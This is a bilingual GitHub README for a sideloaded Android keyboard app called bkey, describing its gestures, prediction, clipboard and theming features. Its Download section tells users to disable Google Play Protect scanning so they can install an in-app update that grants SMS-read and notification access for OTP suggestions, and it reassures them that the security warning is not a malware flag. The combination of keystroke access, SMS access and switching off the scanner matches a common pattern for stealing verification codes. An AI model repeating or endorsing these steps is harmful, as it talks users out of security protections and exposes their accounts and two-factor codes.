# bkey ⌨️

**كيبورد أندرويد بطابع BlackBerry الكلاسيكي — سحب للأعلى لاختيار الاقتراح، وسحب لليسار للحذف.**
**A BlackBerry-style Android keyboard — swipe up to pick a suggestion, swipe left to delete.**

![Build](https://github.com/snooptiger9/bkey-keyboard/actions/workflows/build.yml/badge.svg)
![Release](https://img.shields.io/github/v/release/snooptiger9/bkey-keyboard)
![Platform](https://img.shields.io/badge/platform-Android%207.0%2B-3DDC84?logo=android&logoColor=white)
![Languages](https://img.shields.io/badge/العربية%20%7C%20English-bilingual-blue)

---

## 📖 العربية

### ✨ الوصف

**bkey** كيبورد أندرويد (IME) مستوحى من أزرار بلاك بيري الفيزيائية الكلاسيكية، لكن بتفاعل حديث:
اسحب للأعلى من أي اقتراح لاختياره فوراً، واسحب لليسار على صف الحروف للحذف بدل الضغط المتكرر
على الباكسبيس. يدعم العربية والإنجليزية بالكامل مع تجربة مخصصة بعناية لكل لغة.

### 🚀 المميزات

**✋ الإيماءات (Gestures)**
- سحب للأعلى من أي اقتراح: قبوله فوراً.

  ![سحب للأعلى لقبول الاقتراح](docs/gifs/swipe_up_suggestion.gif)
- سحب أفقي فوق الحروف: حذف آخر كلمة كاملة دفعة واحدة.

  ![سحب جانبي لحذف آخر كلمة](docs/gifs/swipe_delete_word.gif)
- سحب بالاتجاه المعاكس تماماً: تحديد كل النص المكتوب دفعة واحدة.

  ![سحب بالاتجاه المعاكس لتحديد كل النص](docs/gifs/swipe_select_all.gif)
- سحب للأسفل فوق الحروف: نسخ النص المحدد، وتتحول نفس السحبة تلقائياً للصق لمدة دقيقة بعد النسخ.

  ![سحب للأسفل للنسخ](docs/gifs/swipe_copy.gif)
- ضغط مطوّل + سحب على زر المسافة: تحريك المؤشر حرفاً حرفاً.

  ![ضغط مطوّل وسحب زر المسافة لتحريك المؤشر](docs/gifs/cursor_move.gif)
- سحب زر المسافة يميناً/يساراً: تبديل اللغة (عربي/إنجليزي) بدون زر 🌐 منفصل.
- ضغط مطوّل على أي حرف: بوب أب الحروف البديلة (حركات، حروف أجنبية...).

**⌨️ الكتابة والتوقع الذكي**
- تصحيح تلقائي صامت عند المسافة، وتوقع الكلمة التالية (حتى 3 كلمات).
- تعلّم الكلمات الجديدة أثناء الكتابة تلقائياً + مدرّب يدوي يحفظ جملة كاملة فوراً.
- **اقتراح إيموجي تلقائي** حسب الكلمة أو سياق الجملة المكتوبة.

  ![اقتراح إيموجي تلقائي](docs/gifs/emoji_suggest.gif)
- اختصارات نصية: اكتب اختصار (مثل "سع") ويتحول تلقائياً لعبارة كاملة عند المسافة.
- نقطة ومسافة تلقائية بضغطتين متتاليتين على زر المسافة.
- أحرف كبيرة تلقائياً في بداية كل جملة (بالإنجليزي).
- اقتراح أكواد التحقق (OTP) تلقائياً من الرسائل أو واتساب — كل المعالجة محلية على الجهاز.

**📋 الحافظة الذكية**
- درج حافظة كامل: تثبيت، حذف، وحذف تلقائي للعناصر القديمة بعد مدة تختارها (من ساعة إلى 30 يوماً، أو بدون حذف).
- حفظ آخر لقطة شاشة تلقائياً (مصغّرة واحدة تحل محل القديمة).
- آخر نص منسوخ يظهر مباشرة بمنتصف شريط الاقتراحات لإعادة لصقه بسرعة.

  ![الضغط على نص الحافظة بالاقتراحات للصقه](docs/gifs/paste_chip.gif)

**😀 إيموجي و GIF**
- لوحة إيموجي ورموز كاملة، مع قسم "مستخدم حديثاً" (قابل للحذف أو حذف عنصر واحد بالضغط المطول).
- بحث ومعاينة GIF متحركة عبر GIPHY.

**🎨 التخصيص الكامل**
- 3 ثيمات ألوان، 9 أشكال لأزرار الكيبورد، خطوط متعددة (افتراضي/Tajawal).
- تحكم كامل بالحجم: حجم حروف المفاتيح، ارتفاع الكيبورد، ارتفاع شريط الاقتراحات، وحجم خط الاقتراحات.
- لون زر الإدخال، ولون وشفافية الكبسولات العائمة بنافذتي الرموز والحافظة.
- أنميشن ارتداد المفاتيح وأنميشن طيران الكلمة عند القبول — كل منهما قابل للإيقاف لحاله.

**🔊 الصوت والاهتزاز**
- 5 نغمات للكتابة + 5 نغمات مستقلة للسحب والحذف، كل مجموعة بمستوى صوت خاص بها.
- اهتزاز لمسي اختياري عند الضغط والسحب.

**⚙️ تفضيلات إضافية**
- صف أرقام دائم فوق الكيبورد (مع صف مخصص يظهر بحقول كلمات المرور حتى لو كان الصف العام مطفياً).
- أرقام عربية هندية (١٢٣) اختيارية.
- وضع اليد الواحدة (مصغّر يمين أو يسار).
- كتابة بالصوت (زر مايكروفون اختياري).
- بوب أب معاينة الحرف فوق الزر عند اللمس.
- **خصوصية أولاً**: وضع تخفي (Incognito) يوقف التعلّم والحفظ بالحافظة بالكامل، وكلمات المرور/الإيميلات/الروابط
  لا يُتعلَّم منها مطلقاً حتى في الوضع العادي.

### 🔒 الخصوصية والأمان

- لا يوجد اتصال بالإنترنت إلا لميزتي GIF (GIPHY) والكتابة بالصوت، وكلاهما **اختياري بالكامل** —
  تقدر ما تستخدمهما إطلاقاً، ويبقى الكيبورد شغّال بدون أي اتصال بالإنترنت نهائياً.
- اقتراح أكواد التحقق (OTP) **غير موجودة أصلاً** بالتثبيت الأساسي — ما فيه صلاحية رسائل ولا إشعارات إطلاقاً،
  والكيبورد ما يقدر يقرأ أي رسالة نهائياً. تضاف فقط إذا المستخدم نفسه طلبها ونزّل تحديثها من داخل التطبيق،
  وحتى بعدها كل المعالجة على الجهاز فقط ولا تُرسل لأي سيرفر خارجي.
  

### 📥 التحميل

<p>
<a href="https://github.com/snooptiger9/bkey-keyboard/raw/main/release/bkey-latest.apk"><img src="https://user-images.githubusercontent.com/663460/26973090-f8fdc986-4d14-11e7-995a-e7c5e79ed925.png" alt="تحميل ملف APK" height="72"></a>
</p>

إذا احتجت ميزة رمز التحقق، تقدر تفعّلها من داخل التطبيق: الإعدادات ← **اقتراح رمز التحقق (OTP)**، وهناك شرح وزر لتحميل التحديث الذي يضيف الميزة.

> ⚠️ **ملاحظة عن ميزة رمز التحقق (OTP)**
>
> تفعيل هذي الميزة يحتاج تحديثاً يضيف صلاحية قراءة الرسائل وصلاحية الوصول للإشعارات. بسبب هاتين الصلاحيتين بالذات، نظام حماية جوجل يوقف تثبيت التحديث تلقائياً برسالة تحذيرية. هذا سلوك قياسي من جوجل لأي تطبيق يُحمّل من خارج المتجر ويطلب هذي الصلاحيات، وليس عيباً ولا فيروساً بالتطبيق.
>
> إذا تبي الميزة، عطّل فحص الحماية مؤقتاً ثم حمّل التحديث من داخل التطبيق نفسه (الإعدادات ← اقتراح رمز التحقق (OTP) ← زر التحديث):

<details>
<summary><b>خطوات تعليق فحص Play Protect (اضغط للتفصيل)</b></summary>
<br>

1. افتح تطبيق **متجر Google Play**.
2. اضغط صورة حسابك بأعلى يمين الشاشة.
3. اختر **Play Protect**.
4. اضغط أيقونة الإعدادات ⚙️ بأعلى يمين الشاشة.
5. أوقف خيار **Scan apps with Play Protect** — رح تطلع لك رسالة تسألك «Pause app scanning instead?»، اختر **Pause**.
6. رجع لشاشة OTP داخل التطبيق واضغط زر تحميل التحديث، وثبّته.
7. خيار Pause يرجع يشتغل لوحده تلقائياً بعد يوم، لكن الأفضل ترجّعه بنفسك فوراً بعد التحديث (يفضّل يضل شغّال دايماً لباقي تطبيقاتك).

</details>

### 📩 الدعم

إذا عجبك المشروع وتبي تدعمه، تقدر ترسل عبر PayPal:

**[💛 ادعم المشروع عبر PayPal](https://paypal.me/algahmdi)**

---

## 📖 English

### ✨ Overview

**bkey** is an Android keyboard (IME) inspired by the classic BlackBerry physical keyboard, with a
modern gesture twist: swipe up on any suggestion to accept it instantly, and swipe left across the
letter row for quick deletion instead of repeated backspace taps. Fully supports Arabic and English
with a carefully tailored experience for each.

### 🚀 Features

**✋ Gestures**
- Swipe up on any suggestion: accept it instantly.

  ![Swipe up to accept a suggestion](docs/gifs/swipe_up_suggestion.gif)
- Swipe sideways over the keys: delete the last whole word at once.

  ![Swipe sideways to delete the last word](docs/gifs/swipe_delete_word.gif)
- Swipe in the exact opposite direction: select all typed text at once.

  ![Swipe the opposite direction to select all](docs/gifs/swipe_select_all.gif)
- Swipe down over the keys: copy selected text — the same gesture turns into paste for one minute
  afterward.

  ![Swipe down to copy](docs/gifs/swipe_copy.gif)
- Press-and-hold + drag the space bar: move the cursor character by character.

  ![Press-and-hold + drag the space bar to move the cursor](docs/gifs/cursor_move.gif)
- Swipe the space bar left/right: switch language (Arabic/English) without a separate 🌐 button.
- Long-press any key: popup with alternate characters (diacritics, accented letters...).

**⌨️ Smart typing & prediction**
- Silent auto-correct on space, and next-word prediction (up to 3 words).
- On-the-fly word learning as you type, plus a manual trainer that saves a whole sentence instantly.
- **Automatic emoji suggestions** based on the word or sentence context you're typing.

  ![Automatic emoji suggestion](docs/gifs/emoji_suggest.gif)
- Text shortcuts: type a shortcut (e.g. "omw") and it expands to the full phrase on space.
- Double-tap space for an automatic period + space.
- Auto-capitalize the first letter of each sentence (English).
- Automatic verification-code (OTP) suggestions from SMS or WhatsApp — all processed on-device.

**📋 Smart clipboard**
- A full clipboard drawer: pin, delete, and auto-delete old items after a duration you choose
  (from 1 hour to 30 days, or never).
- Automatically saves the last screenshot (a single thumbnail that replaces the previous one).
- The last copied text shows right in the middle suggestion slot for a quick re-paste.

  ![Tapping the clipboard suggestion chip to paste](docs/gifs/paste_chip.gif)

**😀 Emoji & GIF**
- Full emoji and symbols panel with a "Recently used" section (clear it all or long-press to
  remove a single emoji).
- Search and preview animated GIFs via GIPHY.

**🎨 Full customization**
- 3 color themes, 9 key shapes, multiple fonts (System/Tajawal).
- Full size control: key letter size, keyboard height, suggestion bar height, and suggestion
  text size.
- Enter-key color, plus color and opacity for the floating capsules in the symbols/clipboard panels.
- Key-bounce animation and the suggestion-accept flying-word animation — each toggleable on its own.

**🔊 Sound & vibration**
- 5 typing tones + 5 independent swipe/delete tones, each with its own volume level.
- Optional haptic vibration on press and swipe.

**⚙️ More preferences**
- A persistent number row above the keyboard (plus a dedicated row shown in password fields even
  when the general one is off).
- Optional Arabic-Indic digits (١٢٣).
- One-handed mode (compact, left or right).
- Voice typing (optional mic button).
- Key-preview popup above the key on touch.
- **Privacy-first**: Incognito mode disables learning and clipboard saving entirely; passwords,
  emails and links are never learned from, even outside Incognito mode.

### 🔒 Privacy & security

- No network access except for the GIF (GIPHY) and voice-typing features, and both are **fully
  optional** — you can simply never use them, and the keyboard runs with zero internet connection
  at all.
- Verification-code (OTP) suggestions **don't exist at all** in the base install — no SMS or
  notification permission whatsoever, and the keyboard can't read any message. It's only added if
  you specifically ask for it and download its update from inside the app, and even then everything
  is processed on-device only, never sent to any server.


### 📥 Download

<p>
<a href="https://github.com/snooptiger9/bkey-keyboard/raw/main/release/bkey-latest.apk"><img src="https://user-images.githubusercontent.com/663460/26973090-f8fdc986-4d14-11e7-995a-e7c5e79ed925.png" alt="Get the APK from GitHub" height="72"></a>
</p>

If you want the OTP feature, turn it on from inside the app: Settings → **Verification code (OTP) suggestions** — that screen explains it and has a button to download the update that adds it.

> ⚠️ **About the OTP feature**
>
> Turning this on needs an update that adds SMS-read and WhatsApp-notification access. Because of those two specific permissions, Google Play Protect blocks installing that update automatically with a warning screen. This is standard Google behavior for any app installed outside the Play Store that requests these permissions — not a bug or malware flag.
>
> If you want the feature, turn off Play Protect scanning, then download the update from inside the app itself (Settings → Verification code (OTP) suggestions → the download button):

<details>
<summary><b>Steps to pause Play Protect scanning (tap for details)</b></summary>
<br>

1. Open the **Google Play Store** app.
2. Tap your profile picture, top right.
3. Tap **Play Protect**.
4. Tap the ⚙️ settings icon, top right.
5. Turn off **Scan apps with Play Protect** — a prompt will ask "Pause app scanning instead?", pick **Pause**.
6. Go back to the OTP screen in the app, tap the download button, and install it.
7. Pause turns itself back on automatically after a day, but it's better to turn it back on yourself right after the update (recommended to keep it on for your other apps).

</details>

### 📩 Support

If you like the project and want to support it, you can send a tip via PayPal:

**[💛 Support the project on PayPal](https://paypal.me/algahmdi)**

---

<p align="center">Made with ❤️ — bkey</p>
